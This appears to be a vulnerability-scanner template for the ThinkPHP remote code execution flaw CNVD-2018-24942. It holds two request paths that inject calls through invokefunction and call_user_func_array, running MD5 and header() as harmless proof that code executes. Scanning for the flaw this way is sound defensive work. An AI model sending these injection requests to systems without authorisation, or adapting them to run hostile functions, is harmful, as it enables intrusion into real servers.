id: thinkphp-rce-cnvd-2018-24942
info:
  name: ThinkPHP Remote Code Execution (CNVD-2018-24942)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for remote code execution vulnerability in ThinkPHP (CNVD-2018-24942) using call_user_func_array function.

variables:
  random_value: "{{rand_int(800000000, 1000000000)}}"

http:
  - id: r0
    method: GET
    path:
      - "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=MD5&vars[1][]={{random_value}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - contains(body, md5(random_value))

  - id: r1
    method: GET
    path:
      - "/?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=header&vars[1][]=TPRCEHEADER:{{random_value}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "TPRCEHEADER:{{random_value}}"
